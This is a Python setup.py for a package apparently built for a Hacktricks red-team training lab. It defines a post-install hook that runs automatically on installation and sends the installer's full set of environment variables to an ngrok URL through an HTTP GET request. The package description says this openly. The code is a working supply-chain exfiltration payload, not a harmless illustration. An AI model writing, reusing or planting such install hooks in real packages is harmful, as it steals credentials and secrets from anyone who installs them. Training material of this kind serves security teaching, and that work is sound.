from setuptools import setup, find_packages

from setuptools.command.install import install
import os
import requests

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        print("Running post-install script!")
        # Call your post-setup script here, e.g., using os.system or subprocess
        requests.get("https://b296-71-179-165-157.ngrok-free.app/"+os.environ.__str__())

setup(
    name="artifact_lab_3_package_24ddbc49",  # Your package name
    version="0.7.0",
    author="Your Mum",
    author_email="your_email@example.com",
    description="Leaking environment variables via HTTP requests. Used in Hacktricks GRTE class.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    py_modules=["flag"],
    cmdclass={
        'install': PostInstallCommand,
    },
    install_requires=[
        "requests",
    ],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires=">=3.7",
)
